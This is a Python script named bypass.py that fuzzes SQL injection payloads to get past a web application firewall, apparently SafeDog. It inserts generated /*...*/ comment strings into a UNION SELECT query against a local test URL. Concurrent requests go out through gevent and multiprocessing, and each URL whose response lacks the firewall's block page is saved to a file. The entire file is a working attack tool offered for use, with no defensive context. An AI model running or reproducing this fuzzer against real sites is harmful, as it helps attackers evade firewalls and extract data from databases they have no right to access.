#@author:九世
#@time:2019/11/15
#@file:bypass.py
from gevent import monkey;monkey.patch_all()
from multiprocessing import Process
from colorama import init,Fore
import gevent
import requests
import time
import asyncio
import string

init(wrap=True)

class BypassDog(object):
    def __init__(self):
        self.data=string.digits+'!' #定义内容
        self.payload='http://192.168.241.158/sql.php?id=0%20union%20select%201,2'
        self.ybs=[]
        self.djcs=[]
        self.xcs=[]
        self.calc=0
        self.calc2=0
        self.calc3=0
        self.huan='  '
        self.dr=''
        self.r=''

    def reqts(self,da):
        jg=self.payload.replace('%20','/*{}*/'.format(da))
        try:
            rqt=requests.get(url=jg,headers={'user-agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36'})
            if not '网站防火墙' in rqt.text and not 'NULL' in rqt.text:
                print(Fore.GREEN+'[+] '+Fore.WHITE+' Bypass Dog url:{}'.format(jg))
                print(jg,file=open('test.txt','a',encoding='utf-8'))
                exit()
            else:
                print(Fore.RED+'[-] '+Fore.WHITE+' Bypass Dog fuck url:{}'.format(jg))
        except:
            pass

    def xc(self,rw):
        for g in rw:
            self.xcs.append(gevent.spawn(self.reqts,g))

        gevent.joinall(self.xcs)
        self.xcs.clear()


    def djc(self):
        for u in self.ybs:
            if self.calc==100:
                p=Process(target=self.xc,args=(self.djcs,))
                p.start()
                self.calc=0
                self.djcs.clear()

            time.sleep(0.01) #0.01 CPU低于50% 0.005CPU低于70 0.003CPU低于95，根据内容数量来手动设置是否需要延时
            self.djcs.append(u)
            self.calc+=1

        if len(self.djcs)>0:
            p = Process(target=self.xc, args=(self.djcs,))
            p.start()
            self.calc = 0
            self.djcs.clear()

    async def yb(self):
        for g in range(1,len(self.data)+1):
            while True:
                if self.calc3>g:
                    gd=self.dr+'    pod={};self.ybs.append(pod);self.calc2+=1\n{}' \
                               'if self.calc2==100:\n{}' \
                               '    self.djc()\n{}self.calc2=0\n{}self.ybs.clear()\n' \
                               'if len(self.ybs)>0:\n' \
                               '    self.djc();self.calc2=0;self.ybs.clear()'.format(self.r.rstrip('+'),self.huan+'   ',self.huan+'   ',self.huan+'   '+'    ',self.huan+'   '+'    ')
                    exec(gd)
                    self.calc3=0
                    self.huan=' '
                    self.dr=''
                    break
                else:
                    self.dr+="for s{} in self.data:\n{}".format(self.calc3,self.huan)
                    self.r+='s{}+'.format(self.calc3)
                    self.calc3+=1
                    self.huan+=' '


if __name__ == '__main__':
    obj=BypassDog()
    loop=asyncio.get_event_loop()
    tk=loop.create_task(obj.yb())
    loop.run_until_complete(tk)